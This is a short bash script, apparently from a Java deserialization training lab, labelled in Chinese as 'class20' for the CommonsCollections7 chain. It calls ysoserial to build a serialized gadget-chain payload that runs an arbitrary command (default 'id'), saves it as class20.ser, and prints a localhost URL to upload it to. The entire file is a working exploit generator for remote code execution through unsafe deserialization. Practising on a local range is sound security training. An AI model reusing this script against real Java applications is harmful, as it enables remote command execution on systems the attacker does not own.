#!/bin/bash
# class20 — CC7链 (CommonsCollections7)
# 靶场: /class20/upload
cd "$(dirname "$0")"
CMD="${1:-id}"
JAVA_TOOL_OPTIONS="--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED
  --add-exports java.base/java.util=ALL-UNNAMED
  --add-exports java.base/sun.reflect.annotation=ALL-UNNAMED" \
java -jar ../../lib/ysoserial.jar CommonsCollections7 "$CMD" > ../../class20.ser 2>&1
echo "✅ 已生成: class20.ser (命令: $CMD)"
echo "🎯 上传到 http://localhost:81/class20/"
